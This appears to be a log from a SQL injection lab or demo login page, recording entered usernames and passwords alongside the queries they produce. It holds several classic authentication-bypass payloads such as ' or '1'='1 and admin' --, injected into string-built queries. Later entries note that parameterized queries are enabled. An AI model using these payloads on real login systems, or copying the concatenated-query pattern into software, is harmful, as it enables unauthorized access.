2025-04-21 17:03:23.245357 | 用户名: admin' -- | 密码: 12345678 | SQL: SELECT * FROM users WHERE username = 'admin' --' AND password = '12345678'
2025-04-21 17:05:33.732189 | 用户名: ' or '1'='1 | 密码: anything | SQL: SELECT * FROM users WHERE username = '' or '1'='1' AND password = 'anything'
2025-04-21 17:05:33.740390 | 用户名: ' or '1'='1' --  | 密码: anything | SQL: SELECT * FROM users WHERE username = '' or '1'='1' -- ' AND password = 'anything'
2025-04-21 17:05:33.745737 | 用户名: ' OR 1=1# | 密码: anything | SQL: SELECT * FROM users WHERE username = '' OR 1=1#' AND password = 'anything'
2025-04-21 17:05:33.752564 | 用户名: ' OR 1=1-- | 密码: anything | SQL: SELECT * FROM users WHERE username = '' OR 1=1--' AND password = 'anything'
2025-04-21 17:05:33.758271 | 用户名: ' or '' = ' | 密码: anything | SQL: SELECT * FROM users WHERE username = '' or '' = '' AND password = 'anything'
2025-04-21 17:07:16.593576 | 用户名: ' or '1'='1 | 密码: anything | SQL: SELECT * FROM users WHERE username = '' or '1'='1' AND password = 'anything'
2025-04-21 17:07:16.601576 | 用户名: ' or '1'='1' --  | 密码: anything | SQL: SELECT * FROM users WHERE username = '' or '1'='1' -- ' AND password = 'anything'
2025-04-21 17:07:16.606576 | 用户名: ' OR 1=1# | 密码: anything | SQL: SELECT * FROM users WHERE username = '' OR 1=1#' AND password = 'anything'
2025-04-21 17:07:16.611575 | 用户名: ' OR 1=1-- | 密码: anything | SQL: SELECT * FROM users WHERE username = '' OR 1=1--' AND password = 'anything'
2025-04-21 17:07:16.616575 | 用户名: ' or '' = ' | 密码: anything | SQL: SELECT * FROM users WHERE username = '' or '' = '' AND password = 'anything'
2025-04-21 17:08:14.059077 | 用户名: admin | 密码: 21345 | SQL: SELECT * FROM users WHERE username = 'admin' AND password = '21345'
2025-04-21 17:08:18.091379 | 用户名: admin | 密码:  | SQL: SELECT * FROM users WHERE username = 'admin' AND password = ''
2025-04-21 17:08:25.129628 | 用户名: admin | 密码: 123456 | SQL: SELECT * FROM users WHERE username = 'admin' AND password = '123456'
2025-04-21 17:10:22.456704 | 用户名: admin' -- | 密码: wdwdwd | SQL: SELECT * FROM users WHERE username = 'admin' --' AND password = 'wdwdwd'
2025-04-21 17:11:38.156986 | 用户名: ' or '1'='1 | 密码: anything | SQL: SELECT * FROM users WHERE username = '' or '1'='1' AND password = 'anything'
2025-04-21 17:11:38.162078 | 用户名: ' or '1'='1' --  | 密码: anything | SQL: SELECT * FROM users WHERE username = '' or '1'='1' -- ' AND password = 'anything'
2025-04-21 17:11:38.167077 | 用户名: ' OR 1=1# | 密码: anything | SQL: SELECT * FROM users WHERE username = '' OR 1=1#' AND password = 'anything'
2025-04-21 17:11:38.171080 | 用户名: ' OR 1=1-- | 密码: anything | SQL: SELECT * FROM users WHERE username = '' OR 1=1--' AND password = 'anything'
2025-04-21 17:11:38.176893 | 用户名: ' or '' = ' | 密码: anything | SQL: SELECT * FROM users WHERE username = '' or '' = '' AND password = 'anything'
2025-04-21 17:29:39.364850 | 用户名: admin | 密码: rooot | SQL: SELECT * FROM users WHERE username = 'admin' AND password = 'rooot'
2025-04-21 17:30:17.221358 | 用户名: admin | 密码: root | SQL: SELECT * FROM users WHERE username = 'admin' AND password = 'root'
2025-04-21 17:30:18.365766 | 用户名:  | 密码:  | SQL: SELECT * FROM users WHERE username = '' AND password = ''
2025-04-21 17:30:18.695838 | 用户名:  | 密码:  | SQL: SELECT * FROM users WHERE username = '' AND password = ''
2025-04-21 17:30:19.203661 | 用户名:  | 密码:  | SQL: SELECT * FROM users WHERE username = '' AND password = ''
2025-04-21 17:30:19.518673 | 用户名:  | 密码:  | SQL: SELECT * FROM users WHERE username = '' AND password = ''
2025-04-21 17:30:19.706871 | 用户名:  | 密码:  | SQL: SELECT * FROM users WHERE username = '' AND password = ''
2025-04-21 17:30:19.843281 | 用户名:  | 密码:  | SQL: SELECT * FROM users WHERE username = '' AND password = ''
2025-04-21 17:30:20.002171 | 用户名:  | 密码:  | SQL: SELECT * FROM users WHERE username = '' AND password = ''
2025-04-21 17:30:20.152317 | 用户名:  | 密码:  | SQL: SELECT * FROM users WHERE username = '' AND password = ''
2025-04-21 17:31:35.648521 | 用户名: admin' or '1'='1 | 密码: efefefef | SQL: SELECT * FROM users WHERE username = 'admin' or '1'='1' AND password = 'efefefef'
2025-04-21 17:38:27.139900 | 用户名: admin | 密码: 11111111111111111111111111111111111 | SQL: SELECT * FROM users WHERE username = 'admin' AND password = '11111111111111111111111111111111111'
2025-04-21 17:44:57.646917 | 用户名: asfsf | 密码: sdfdf | SQL: SELECT * FROM users WHERE username = 'asfsf' AND password = 'sdfdf'
2025-04-21 21:09:11.419615 | 用户名: ' or '1'='1 | 密码: anything | SQL: 参数化查询已启用
2025-04-21 21:09:11.426612 | 用户名: ' or '1'='1' --  | 密码: anything | SQL: 参数化查询已启用
2025-04-21 21:09:11.431235 | 用户名: ' OR 1=1# | 密码: anything | SQL: 参数化查询已启用
2025-04-21 21:09:11.435343 | 用户名: ' OR 1=1-- | 密码: anything | SQL: 参数化查询已启用
2025-04-21 21:09:11.439863 | 用户名: ' or '' = ' | 密码: anything | SQL: 参数化查询已启用
2025-04-21 21:09:33.996942 | 用户名: admin'1'='1 | 密码: wekjhnf | SQL: 参数化查询已启用
2025-04-21 21:10:19.856298 | 用户名: ' or '1'='1 | 密码: anything | SQL: SELECT * FROM users WHERE username = '' or '1'='1' AND password = 'anything'
2025-04-21 21:10:19.863300 | 用户名: ' or '1'='1' --  | 密码: anything | SQL: SELECT * FROM users WHERE username = '' or '1'='1' -- ' AND password = 'anything'
2025-04-21 21:10:19.866448 | 用户名: ' OR 1=1# | 密码: anything | SQL: SELECT * FROM users WHERE username = '' OR 1=1#' AND password = 'anything'
2025-04-21 21:10:19.870610 | 用户名: ' OR 1=1-- | 密码: anything | SQL: SELECT * FROM users WHERE username = '' OR 1=1--' AND password = 'anything'
2025-04-21 21:10:19.874609 | 用户名: ' or '' = ' | 密码: anything | SQL: SELECT * FROM users WHERE username = '' or '' = '' AND password = 'anything'
2025-04-21 21:10:38.002031 | 用户名: admin'1'='1 | 密码: dewsfwef | SQL: SELECT * FROM users WHERE username = 'admin'1'='1' AND password = 'dewsfwef'
2025-04-21 21:10:44.419457 | 用户名: admin' or '1'='1 | 密码: ewfwefwefewf | SQL: SELECT * FROM users WHERE username = 'admin' or '1'='1' AND password = 'ewfwefwefewf'
2025-04-21 21:11:17.469128 | 用户名: admin' or '1'='1' -- | 密码: aesfawefew | SQL: SELECT * FROM users WHERE username = 'admin' or '1'='1' --' AND password = 'aesfawefew'
